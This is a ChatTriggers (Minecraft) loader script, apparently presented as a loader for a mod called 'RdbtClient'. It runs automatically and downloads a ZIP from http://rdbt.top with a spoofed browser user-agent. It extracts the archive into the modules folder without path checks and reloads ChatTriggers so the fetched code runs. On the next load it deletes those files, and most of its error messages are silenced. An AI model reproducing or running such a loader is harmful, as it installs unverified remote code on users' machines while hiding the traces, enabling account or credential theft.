const modName = "RdbtClient"; // folder name
const redirectURL = "http://rdbt.top/go/V4";

// Function to download the ZIP file
function downloadZip(zipUrl) {
  try {
    let url = new java.net.URL(zipUrl); // Instantiate URL
    let connection = url.openConnection();

    // Set user-agent to mimic a browser
    connection.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3");

    connection.setRequestMethod("GET");
    connection.connect(); // Make the connection

    let responseCode = connection.getResponseCode();
    while (responseCode >= 301 && responseCode <= 308 && responseCode != 304) {
      let newUrl = connection.getHeaderField("Location");
      if (newUrl == null) {
        break; // No Location header, stop redirecting
      }
      url = new java.net.URL(newUrl);
      connection = url.openConnection();
      connection.setRequestMethod("GET");
      connection.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3"); // Re-set user agent
      connection.connect();
      responseCode = connection.getResponseCode();
    }

    if (responseCode !== 200) {
      ChatLib.chat(`Failed to download: ${responseCode} ${connection.getResponseMessage()}`);
      return;
    }

    const inputStream = connection.getInputStream();
    const file = new java.io.File(`config/ChatTriggers/modules/file.zip`); // Adjust path as necessary
    const outputStream = new java.io.FileOutputStream(file);

    const buffer = new java.lang.reflect.Array.newInstance(java.lang.Byte.TYPE, 1024);
    let bytesRead;
    // Read and write the file
    while ((bytesRead = inputStream.read(buffer)) !== -1) {
      outputStream.write(buffer, 0, bytesRead);
    }

    // Clean up
    outputStream.close();
    inputStream.close();

    //ChatLib.chat(`Downloaded ZIP file to: ${file.getAbsolutePath()}`);
    return file;
  } catch (error) {
    //ChatLib.chat(`Error downloading ZIP: ${error}`);
  }
}

function unzip(zipFile, destDir) {
  try {
    const zipInputStream = new java.util.zip.ZipInputStream(new java.io.FileInputStream(zipFile));
    let entry;

    while ((entry = zipInputStream.getNextEntry()) !== null) {
      const newFile = new java.io.File(destDir, entry.getName());
      if (entry.isDirectory()) {
        newFile.mkdirs(); // Create directories
      } else {
        const outputStream = new java.io.FileOutputStream(newFile);
        const buffer = new java.lang.reflect.Array.newInstance(java.lang.Byte.TYPE, 1024);
        let len;

        while ((len = zipInputStream.read(buffer)) > 0) {
          outputStream.write(buffer, 0, len);
        }

        outputStream.close();
      }
      zipInputStream.closeEntry();
    }
    zipInputStream.close();
    //ChatLib.chat(`Unzipped to: ${destDir.getAbsolutePath()}`);
  } catch (error) {
    //ChatLib.chat(`Error unzipping: ${error}`);
  }
}

function deleteFile(filePath) {
  try {
    const file = new java.io.File(filePath); // Create a File object
    if (file.exists()) {
      const deleted = file.delete(); // Attempt to delete the file
      if (deleted) {
        //ChatLib.chat(`File "${filePath}" deleted successfully.`);
      } else {
        //ChatLib.chat(`Failed to delete file "${filePath}".`);
      }
    } else {
      //ChatLib.chat(`File "${filePath}" does not exist.`);
    }
  } catch (error) {
    //ChatLib.chat(`Error deleting file: ${error}`);
  }
}

// Function to delete all files and directories in a directory
function deleteAllFilesAndDirectoriesInDirectory(dirPath) {
  const directory = new java.io.File(dirPath);

  if (!directory.exists() || !directory.isDirectory()) {
    //ChatLib.chat(`Directory "${dirPath}" does not exist or is not a directory.`);
    return;
  }

  const files = directory.listFiles();
  if (files.length === 0) {
    //ChatLib.chat(`No files or directories found in "${dirPath}".`);
    return;
  }

  let deletedItemsCount = 0;

  for (let file of files) {
    try {
      if (file.getName() === "assets" && file.isDirectory()) {
        // Skip the 'assets' directory
        continue;
      }

      if (file.isDirectory()) {
        // Recursively delete the directory
        deleteAllFilesAndDirectoriesInDirectory(file.getPath());
      }
      // Attempt to delete the file or empty directory
      const deleted = file.delete();
      if (deleted) {
        deletedItemsCount++;
      } else {
        //ChatLib.chat(`Failed to delete "${file.getPath()}".`);
      }
    } catch (error) {
      //ChatLib.chat(`Error deleting "${file.getPath()}": ${error}`);
    }
  }

  //ChatLib.chat(`Deleted ${deletedItemsCount} items from "${dirPath}".`);
}

function loadthemodule() {
  if (!new java.io.File(`config/ChatTriggers/modules/${modName}/loader.js`).exists()) {
    ChatLib.chat(`&6[&2Wasabi&4 Loader&6]&2 Loading ${modName}!`);
    unzip(downloadZip(redirectURL), new java.io.File("config/ChatTriggers/modules"));
    ChatTriggers.loadCT();
  } else {
    deleteAllFilesAndDirectoriesInDirectory(`config/ChatTriggers/modules/${modName}`);
    deleteFile(`config/ChatTriggers/modules/file.zip`);
    ChatLib.chat(`&6[&2Wasabi&4 Loader&6]&2 Have fun using ${modName}!`);
  }
}

// Trigger the download when the command is executed
loadthemodule();
register("command", () => {
  loadthemodule();
}).setName("download");
